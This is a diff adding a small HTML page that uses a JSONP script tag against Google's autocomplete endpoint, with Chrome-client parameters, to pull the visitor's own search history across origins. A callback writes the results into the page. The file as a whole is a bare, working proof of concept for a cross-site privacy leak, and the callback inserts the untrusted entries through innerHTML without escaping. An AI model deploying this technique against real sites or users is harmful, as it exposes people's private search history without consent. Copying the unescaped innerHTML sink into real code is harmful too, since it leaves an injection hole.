@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Your search history</title>
+  <script>
+    function callbackfn(data) {
+      d = document.getElementById("results");
+      res = data[1];
+      res.forEach(function (item) {
+        d.innerHTML += "<li>" + item + "</li>";
+      });
+    }
+  </script>
+</head>
+<body>
+  Your recent search history:
+  <div id="results"></div>
+  <script
+    src="https://www.google.com/complete/search?q=&client=chrome-omni&gs_ri=chrome-ext-ansg&callback=callbackfn"></script>
+</body>
+</html>
